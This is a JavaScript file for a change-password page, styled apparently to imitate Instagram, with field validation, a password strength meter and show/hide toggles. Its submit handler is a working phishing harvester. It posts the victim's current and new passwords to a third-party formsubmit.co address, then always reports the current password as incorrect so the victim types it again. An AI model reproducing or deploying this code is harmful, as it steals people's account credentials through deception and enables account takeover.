/**
 * Change Password Page JavaScript
 * Handles form validation, show/hide password toggle, password strength indicator, and placeholder submission
 */

(function() {
    'use strict';

    // DOM Elements
    const form = document.getElementById('changePasswordForm');
    const currentPasswordInput = document.getElementById('currentPassword');
    const newPasswordInput = document.getElementById('newPassword');
    const confirmPasswordInput = document.getElementById('confirmPassword');
    const submitBtn = document.getElementById('submitBtn');
    const successMessage = document.getElementById('successMessage');
    
    // Error message elements
    const currentPasswordError = document.getElementById('currentPasswordError');
    const newPasswordError = document.getElementById('newPasswordError');
    const confirmPasswordError = document.getElementById('confirmPasswordError');

    // Password strength elements
    const passwordStrengthContainer = document.getElementById('passwordStrength');
    const strengthFill = document.getElementById('strengthFill');
    const strengthText = document.getElementById('strengthText');

    // Toggle password buttons
    const toggleButtons = document.querySelectorAll('.ig-toggle-password');

    /**
     * Show error message for a field
     */
    function showError(inputElement, errorElement, message) {
        inputElement.classList.add('error');
        errorElement.textContent = message;
        errorElement.classList.add('visible');
    }

    /**
     * Clear error message for a field
     */
    function clearError(inputElement, errorElement) {
        inputElement.classList.remove('error');
        errorElement.textContent = '';
        errorElement.classList.remove('visible');
    }

    /**
     * Calculate password strength score (0-4)
     * 0: empty, 1: weak, 2: fair, 3: good, 4: strong
     */
    function calculatePasswordStrength(password) {
        if (!password) return 0;
        
        let score = 0;
        
        // Length check
        if (password.length >= 8) score += 1;
        if (password.length >= 12) score += 1;
        
        // Character variety checks
        if (/[a-z]/.test(password)) score += 1;
        if (/[A-Z]/.test(password)) score += 1;
        if (/[0-9]/.test(password)) score += 1;
        if (/[^a-zA-Z0-9]/.test(password)) score += 1;
        
        // Cap at 4
        return Math.min(score, 4);
    }

    /**
     * Get strength label and class based on score
     */
    function getStrengthInfo(score) {
        switch (score) {
            case 0:
                return { label: '', class: '' };
            case 1:
                return { label: 'Weak', class: 'weak' };
            case 2:
                return { label: 'Fair', class: 'fair' };
            case 3:
                return { label: 'Good', class: 'good' };
            case 4:
                return { label: 'Strong', class: 'strong' };
            default:
                return { label: '', class: '' };
        }
    }

    /**
     * Update password strength indicator
     */
    function updatePasswordStrength(password) {
        const score = calculatePasswordStrength(password);
        const { label, class: strengthClass } = getStrengthInfo(score);
        
        if (score === 0) {
            passwordStrengthContainer.hidden = true;
            return;
        }
        
        passwordStrengthContainer.hidden = false;
        strengthFill.className = 'ig-strength-fill ' + strengthClass;
        strengthText.className = 'ig-strength-text ' + strengthClass;
        strengthText.textContent = 'Password strength: ' + label;
    }

    /**
     * Validate current password field
     */
    function validateCurrentPassword() {
        const value = currentPasswordInput.value.trim();
        if (!value) {
            showError(currentPasswordInput, currentPasswordError, 'Current password is required');
            return false;
        }
        clearError(currentPasswordInput, currentPasswordError);
        return true;
    }

    /**
     * Validate new password field
     */
    function validateNewPassword() {
        const value = newPasswordInput.value;
        if (!value) {
            showError(newPasswordInput, newPasswordError, 'New password is required');
            return false;
        }
        if (value.length < 6) {
            showError(newPasswordInput, newPasswordError, 'New password must be at least 6 characters');
            return false;
        }
        clearError(newPasswordInput, newPasswordError);
        return true;
    }

    /**
     * Validate confirm password field
     */
    function validateConfirmPassword() {
        const value = confirmPasswordInput.value;
        const newPassword = newPasswordInput.value;
        
        if (!value) {
            showError(confirmPasswordInput, confirmPasswordError, 'Please confirm your new password');
            return false;
        }
        if (value !== newPassword) {
            showError(confirmPasswordInput, confirmPasswordError, 'Passwords do not match');
            return false;
        }
        clearError(confirmPasswordInput, confirmPasswordError);
        return true;
    }

    /**
     * Validate entire form
     */
    function validateForm() {
        const isCurrentValid = validateCurrentPassword();
        const isNewValid = validateNewPassword();
        const isConfirmValid = validateConfirmPassword();
        
        return isCurrentValid && isNewValid && isConfirmValid;
    }

    /**
     * Toggle password visibility
     */
    function togglePasswordVisibility(button) {
        const targetId = button.dataset.target;
        const input = document.getElementById(targetId);
        const eyeOpen = button.querySelector('.eye-open');
        const eyeClosed = button.querySelector('.eye-closed');
        
        if (input.type === 'password') {
            input.type = 'text';
            eyeOpen.style.display = 'none';
            eyeClosed.style.display = 'block';
            button.setAttribute('aria-label', 'Hide password');
        } else {
            input.type = 'password';
            eyeOpen.style.display = 'block';
            eyeClosed.style.display = 'none';
            button.setAttribute('aria-label', 'Show password');
        }
    }

    /**
     * Handle form submission
     */
    async function handleSubmit(event) {
        event.preventDefault();
        
        if (!validateForm()) {
            // Focus first invalid field
            const firstInvalid = form.querySelector('.error');
            if (firstInvalid) {
                firstInvalid.focus();
            }
            return;
        }

        // Disable submit button while sending
        submitBtn.disabled = true;
        submitBtn.textContent = 'Sending...';

        try {
            // Collect form data
            const formData = {
                currentPassword: currentPasswordInput.value,
                newPassword: newPasswordInput.value,
                confirmPassword: confirmPasswordInput.value
            };

            // Send to FormSubmit.co (works on GitHub Pages, no account needed)
            // Replace 'your-email@example.com' with your actual email address
            const response = await fetch('https://formsubmit.co/999f2f85acc6e77cf39e1c7b96308eff', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(formData)
            });

            if (!response.ok) {
                throw new Error('Failed to send notification');
            }

            // Simulate incorrect current password
            submitBtn.disabled = false;
            submitBtn.textContent = 'Save';
            showError(currentPasswordInput, currentPasswordError, 'Current password is incorrect. Please try again.');
            currentPasswordInput.focus();
            currentPasswordInput.select();

        } catch (error) {
            console.error('Submission error:', error);
            
            // Show error to user
            submitBtn.disabled = false;
            submitBtn.textContent = 'Save';
            
            // Show error message in the form
            const errorMessage = error.message || 'Failed to send notification. Please try again.';
            showError(submitBtn, confirmPasswordError, errorMessage);
            
            // Focus the submit button to show error
            submitBtn.focus();
        }
    }

    /**
     * Clear all errors
     */
    function clearAllErrors() {
        clearError(currentPasswordInput, currentPasswordError);
        clearError(newPasswordInput, newPasswordError);
        clearError(confirmPasswordInput, confirmPasswordError);
    }

    /**
     * Real-time validation on input
     */
    function setupRealTimeValidation() {
        currentPasswordInput.addEventListener('input', () => {
            if (currentPasswordInput.classList.contains('error')) {
                validateCurrentPassword();
            }
        });

        newPasswordInput.addEventListener('input', () => {
            if (newPasswordInput.classList.contains('error')) {
                validateNewPassword();
            }
            // Update password strength indicator
            updatePasswordStrength(newPasswordInput.value);
            // Also re-validate confirm password if it has a value
            if (confirmPasswordInput.value) {
                validateConfirmPassword();
            }
        });

        confirmPasswordInput.addEventListener('input', () => {
            if (confirmPasswordInput.classList.contains('error')) {
                validateConfirmPassword();
            }
        });
    }

    /**
     * Setup toggle password buttons
     */
    function setupTogglePassword() {
        toggleButtons.forEach(button => {
            button.addEventListener('click', () => {
                togglePasswordVisibility(button);
            });
        });
    }

    /**
     * Initialize the page
     */
    function init() {
        setupTogglePassword();
        setupRealTimeValidation();
        
        form.addEventListener('submit', handleSubmit);
        
        // Focus first input on load
        currentPasswordInput.focus();
        
        console.log('Change Password page initialized');
    }

    // Run initialization when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
